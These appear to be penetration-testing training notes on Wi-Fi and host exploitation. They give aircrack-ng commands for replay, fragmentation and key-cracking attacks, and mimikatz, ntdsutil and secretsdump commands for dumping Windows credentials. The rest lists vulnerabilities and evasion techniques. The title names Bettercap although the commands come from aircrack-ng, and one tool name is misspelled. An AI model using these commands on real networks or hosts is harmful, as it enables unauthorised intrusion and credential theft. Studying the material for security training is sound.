# Bettercap and Wi-Fi Attack Techniques

## Replay Attacks with Bettercap

### Steps to Perform a Replay Attack
1. **Kill Conflicting Processes:**
   ```bash
   airmon-ng check kill
   ```
2. **Enable Monitor Mode:**
   ```bash
   airmon-ng start wlan0
   ```
3. **Scan for Networks:**
   ```bash
   airodump-ng wlan0mon
   ```
4. **Find a WPA Network to Target:**
   ```bash
   airodump-ng --bssid BSSIDMAC -c 6 --write output wlan0mon
   ```
5. **Start the Replay Attack (Fake Authentication):**
   ```bash
   aireplay-ng -1 0 -a BSSIDMAC -e SSIDName wlan0mon
   ```
6. **Send ARP Requests (Type 3):**
   ```bash
   aireplay-ng -3 -b BSSIDMAC wlan0mon
   ```
7. **Re-authenticate (if needed):**
   ```bash
   aireplay-ng -1 0 -a BSSIDMAC -e SSIDName wlan0mon
   ```
8. **Crack the Captured Hashes:**
   ```bash
   aircrack-ng -b BSSIDMAC output-01.cap
   ```

### Fragmentation Attacks
1. **Kill Conflicting Processes:**
   ```bash
   airmon-ng check kill
   ```
2. **Perform Fragmentation Attack:**
   ```bash
   aireplay-ng -5 -b BSSIDMAC -e SSIDName -h SOURCEMAC wlan0 --write output
   ```
3. **Generate PRGA Output:**
   ```bash
   packetforce-ng -0 -a BSSIDMAC -h SOURCEMAC -y output-01.cap -w prgaOutput
   ```
4. **Replay PRGA Output:**
   ```bash
   aireplay-ng -r prgaOutput wlan0
   ```

## Penetration Testing Overview
**Version 0.3**  
Copyright © Xservus Limited  
Page 44

### Enabling Monitor Mode
```bash
airmon-ng start wlan0
```
### Monitoring Networks
```bash
airodump-ng wlan0mon
```
### Saving Output
```bash
airodump-ng wlan0mon -w pwnWIFI
```
### Airodump Scan Visualizer
- Load the CSV file in the [Airodump Scan Visualizer](https://github.com/pentesteracademy/airodump-scan-visualizer).

## Specialized Systems
### Mobile Systems
- **Android**
- **iOS**

### Industrial Control Systems (ICS) and SCADA
- **ICS:** Controls physical devices.
- **Tools:**
  - ICSExploit
- **SCADA:** Supervisory control and data acquisition, manages ICS.

### Embedded Systems
- **Industrial Systems**
- **Real-Time Operating Systems (RTOS):** Often lack security features.

### Internet of Things (IoT)
- **Vulnerabilities:**
  - Buffer Overflows
  - Command Injection
  - SQL Injection
  - SYN Floods
- **Examples:**
  - Mirai botnet (DVRs, Baby Monitors, etc.)

### Point of Sale Systems
- **Devices:**
  - Tablets
  - Custom Devices
- **Payments:** PCI-DSS compliance may be required.
- **Powered by:**
  - Raspberry Pis, etc.

## Host-Based Exploitation
### Systems
- **Windows**
- **UNIX/Linux (NIX)**
- **macOS (BSD Based)**
- **Android**
- **iOS**

### Linux Package Managers
- **Debian/Ubuntu:**
  - `apt` (Advanced Packaging Tool)
  - `aptitude` (GUI-based package manager)
  - `dpkg`
- **CentOS:**
  - `yum` (Yellowdog Updater, Modified)
- **SUSE:**
  - `yast`
- **Red Hat:**
  - `rpm` (Red Hat Package Manager)
- **Arch Linux:**
  - `pacman`

### Windows Systems and Vulnerabilities
- **Language:** C-based (no bounds checking, leading to vulnerabilities)
- **Security:**
  - Closed Source
  - Requires secure coding
  - Reliant on vendor for patching
- **Codebase:** > 50 million lines of code
- **Third-party micro-patching available**

### Types of Vulnerabilities
- **Remote Code Execution (RCE)**
- **Buffer Overflow**
- **Denial of Service (DoS)**
- **Memory Corruption**
- **Privilege Escalation**
- **Information Disclosure**
- **Security Feature Bypasses (e.g., UAC Bypass)**

### Web Application Vulnerabilities
- **Cross-Site Scripting (XSS)**
- **Directory Traversal**
- **Cross-Site Request Forgery (XSRF)**
- **OWASP Top 10**: [Link](https://owasp.org/www-project-top-ten/)

## Common Windows Exploit Examples
- **Historical Vulnerabilities:**
  - IIS 5.0 Unicode
  - IIS 5.0 WebDAV
  - RPC DCOM (MS08-067)
  - SMB NetAPI
  - Null sessions
  - LM password hash weaknesses
- **Modern Vulnerabilities:**
  - MS17-010 (Eternal Blue)
  - CVE-2018-8120
  - RDP Brute Force
  - ALPC Task Scheduler Privilege Escalation (CVE-2019-0841)
  - Extraction of GPP Passwords
  - Extraction of passwords from unattended installation files

## Dumping Hashes & Password Cracking
### Stored Credentials
- **Hashes:** SAM database
- **SYSKEY:** Registry
- **Active Directory Passwords:**
  - NTDS.DIT
  - MD4 (NT hash)
  - LM
  - DES_CBC_MD5
  - AES256_CTS_HMAC_SHA1
  - MD5 (WDIGEST)
  - Reversible Encrypted Clear Text Password
- **Other:**
  - Certificates
  - Kerberos Tickets
  - LSA Secrets

### Techniques
- **Steal creds from files (e.g., GPP, SYSPREP)**
- **Dump creds from running processes**
- **Dump processes from memory (Hibernation files, VM memory files)**
- **Dump creds from SAM**
- **Dump creds from registry**
- **Dump from NTDS.dit**
- **Domain Controller Replication (Mimikatz/Impacket)**
- **Keylogging**
- **Social Engineering**

## Windows Credential Dumping
### Dumping the SAM
```bash
reg save hklm\sam samreg.hiv
reg save hklm\security securityreg.hiv
mimikatz.exe
lsadump::sam samreg.hiv securityreg.hiv
```
### Dumping Passwords Live
```bash
mimikatz.exe
privilege::debug
log mimilog.log
sekurlsa::logonpasswords
```
### Dumping NTDS.DIT
- **Copy the NTDS file and SYSTEM files:**
  ```bash
  ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q
  ```
- **Extract hashes using PowerSploit:**
  ```powershell
  Get-ADDBAccount -All -DBPath ‘ntds.dit’ -BootKey SYSTEM
  ```
- **Extract using Impacket:**
  ```bash
  impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
  ```

## Common Nix Vulnerabilities
- **Basis: C language**
- **Open Source, inconsistent development**
- **Common Vulnerabilities:**
  - POODLE
  - Heartbleed
  - XSS/XSRF
  - SQL Injection
  - SMB Overflows
  - Enumeration

### LINUX
- **GNU:** Operating system
- **Linux:** Kernel (component of the OS)

### Common Exploits
- **RET2LIBC**
- **DirtyCow (Copy on Write)**
- **Five Year Bug (2009)**
- **Remote Root Flaw**
- **Insecure SUDO configuration**
- **Insecure SUDO binaries**
- **Sticky bits**
- **SUID BIT set**

### Password Cracking for LINUX
- **Credentials stored in:**
  - `/etc/passwd`
  - `/etc/shadow`
- **Tools:**
  - Unshadow
  - Meterpreter: `hashdump`
  - Mimipenguin (memory dump)
  - SAMBA
  - Key Logging

### Password Hash Types (NIX)
- `$1`: MD5
- `$2a`: Blowfish
- `$5`: SHA-256
- `$6`: SHA-512

## Protocol Exploitation
### Windows
- **Unnecessary Services:**
  - IIS in Windows 2000
- **SMB 1.0 (Changed in Windows 10 Anniversary Build and greater)**
- **Domain Account Password Caching:**
  - 10 Domain Logins Cached
  - Default accounts:
    - Administrator (SID starting “S-1-5-21” and ending “-500”)
    - Guest (SID starting “S-1-5-21” and ending “-501”)
- **Weak Default Security Logging**

### NIX
- **User home permissions**
- **World-readable and writeable directories/files**
- **Insecure mount/export options**
- **Services with weak default settings**
- **Apps with weak default settings**

### Protocols and Services
- **Windows:**
  - Supports multiple protocols and configurations
  - Provides software for most services (from Microsoft)
- **Linux:**
  - Supports multiple protocols and configurations
  - Depends on third parties

## LAB Activity
### Windows
- **Install Roles and Features:**
  - IIS
  - NFS

### Linux
- **Install Software:**
  - Apache2
  - Terminator

### Exploitation
- **Windows 7:**
  - Exploit MS17-010 using Metasploit
  - Exploit MS17-010 using Python exploit

## File Permissions and Exploitations
### Windows
- **File Permissions (ACLs)**
- **Share Permissions**
- **Alternate Data Streams (ADS)**
  - Files have two streams:
    - Data
    - Resource (hide data in ADS, e.g., hide a binary inside a txt file)
- **Unquoted Service Path Privilege Escalation**
  - Metasploit
  - PowerSploit
- **DLL Hijacking**
- **NTFS Encryption Bypass**
- **SAM/SYSKEY offline attacks**
- **EFS**
  - Copying EFS to a network share will decrypt them
- **Bitlocker Exploits**

### Linux
- **Insecure Permissions**
- **Sticky BIT**
- **SUID BIT**
- **GUID BIT**
- **Symbolic Link/Broken Symbolic Link Exploitation**
- **Secure Shell Escapes**

### Linux Sensitive Files
- `/etc/profile`
- `/etc/hosts`
- `/etc/resolv.conf`
- `/etc/pam.d`
- `~/.bash_profile`
- `~/.bash_login`
- `~/.profile`
- `/home`

### Resources
- [GTFOBins](https://gtfobins.github.io/)

## Kernel Vulnerabilities and Exploits
- **Privilege Escalation**
- **DoS**
- **Common Vulnerabilities:**
  - Use-After-Free
  - Buffer Overflow

## Default Accounts
### Windows
- **Administrator**
- **Guest**
- **KRBTGT**
- **DefaultAccount**
- **WDAGUtility**
- **Defaultuser()**

### Linux (nix)
- **/etc/passwd:**
  - root
  - adm
  - nobody
  - sshd
  - lp
  - uucp

## Sandboxes
### Windows
- **Guest**
- **Low Priv Users (e.g., IIS_USR)**
- **Virtual Machines**
- **Browser Sandboxes**
- **Adobe Flash Sandbox**
- **Containers:**
  - Docker
  - Hyper-V Containers
- **Mobile Apps**
- **PDF and Documents**
- **Antivirus Quarantine Features**
- **Defender SmartScreen**
- **Mail Program Sandboxes**

### Escape Techniques
- **Sleeps**
- **Large Files**
- **Polymorphic Malware**
- **Rootkits/Bootkits**
- **Encryption**
- **Logic Bombs**
- **Archive Tools**
- **Binary Packers**
- **Network Fast Flux (Rotating IPs or jumping hosts)**
- **Sandbox Detection/Evasion**

## macOS & iOS
- **macOS (based on BSD):**
  - [CVE Details](https://www.cvedetails.com/product/156/Apple-Mac-Os-X.html?vendor_id=49)
- **IOMobileFrameBuffer (iOS)**
- **High Sierra:**
  - Root access with no password
- **Mactans:**
  - USB attack
- **Jailbreaking iOS:**
  - Keyraider
- **Thunderstrike:**
  - Thunderbolt bootkit (OS 10 firmware device)
- **iCloud API vulnerabilities**
- **MaControl Backdoor (OS X)**
- **Graphic Driver Vulnerability (iOS)**

## Android
- **Theft**
- **Lack of Encryption**
- **Side-Loading Apps**
- **Root devices**
- **Weak or No Passwords**
- **Biometric Bypass**
- **SQLLite Injection**
- **Excessive App Permissions**
- **Insure application communications**
- **No or disabled security tools (e.g., Antivirus)**
- **Missing Patches/Out of Date Software**
- **QuadRooter:**
  - Qualcomm Chipset Vulnerability
- **Certifi-Gate mRST flaw:**
  - Allows sideloading (< Lollipop (5.1))
- **Stagefright MMS Privesc and RCE (< Lollipop (5.1))**
- **Installer hijacking**
- **TowelRoot (< Kitkat (4.4))**
- **Cross-platform protocol vulnerabilities:**
  - DirtyCow
  - POODLE

## Physical Attacks
- **Unencrypted Storage**
- **Cold Boot Attacks**